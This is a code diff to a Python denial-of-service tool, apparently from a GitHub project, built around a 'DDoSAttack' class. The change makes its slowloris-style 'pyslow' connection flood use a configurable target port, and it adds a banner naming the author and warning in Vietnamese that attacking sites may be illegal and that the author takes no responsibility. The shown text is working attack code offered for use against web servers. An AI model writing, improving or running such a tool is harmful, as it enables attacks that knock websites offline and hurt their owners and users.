@@ -2,7 +2,7 @@ import os
 import threading
 import time
 import requests
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urlunparse
 from colorama import Fore, Style
 from socket import *
 from random import randrange, choice
@@ -18,13 +18,15 @@ print("""
 class DDoSAttack:
     def __init__(self, target_url, threads):
         # Đảm bảo URL có schema
-        if not urlparse(target_url).scheme:
+        parsed_url = urlparse(target_url)
+        if not parsed_url.scheme:
             target_url = 'http://' + target_url
         self.target_url = target_url
         self.threads = threads
         self.attack_num = 0
         self.target_domain = urlparse(target_url).netloc
         self.target_path = urlparse(target_url).path or "/"
+        self.target_port = urlparse(target_url).port or 80  # Mặc định là port 80 nếu không có port
 
     def start(self):
         print(f"Starting attack on {self.target_url}")
@@ -80,7 +82,7 @@ class DDoSAttack:
     def pyslow(self):
         try:
             sock = socket(AF_INET, SOCK_STREAM)
-            sock.connect((self.target_domain, 80))
+            sock.connect((self.target_domain, self.target_port))
             sock.send(b'GET / HTTP/1.1\r\n')
             time.sleep(5)
             print(Fore.GREEN + "Pyslow connection established!" + Style.RESET_ALL)
@@ -127,6 +129,11 @@ def menu():
  \ \_/ / { || {_} }/ {-. \{ {__-`{ {__-`    { {__-``-' '-'| } { |} {-. \{ |/ {-. \ 
   \   /  | }| {_} }\ '-} /.-._} }.-._} }    .-._} }  } {  \ `-' /} '-} /| }\ '-} / 
    `-'   `-'`----'  `---' `----' `----'     `----'   `-'   `---' `----' `-' `---'  
+AuThor: __VIBOSS__
+Github: https://github.com/dhungx/ddos
+ĐỪNG TẤN CÔNG TRANG WEB CỦA CHÍNH PHỦ (NHÀ NƯỚC)
+TÁC GIẢ SẼ KHÔNG CHỊU BẤT CỨ TRÁCH NHIỆM GÌ CỦA BẠN GÂY RA
+HÃY CẨN THẬN VÌ VIỆC BẠN SẮP LÀM CÓ THỂ LÀ PHẠP PHÁP
 """ + Style.RESET_ALL)
     print(Style.BRIGHT + Fore.YELLOW + "[INFORMATION!]" + Fore.WHITE + " Press CTRL + C and ENTER to exit!!")
     print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
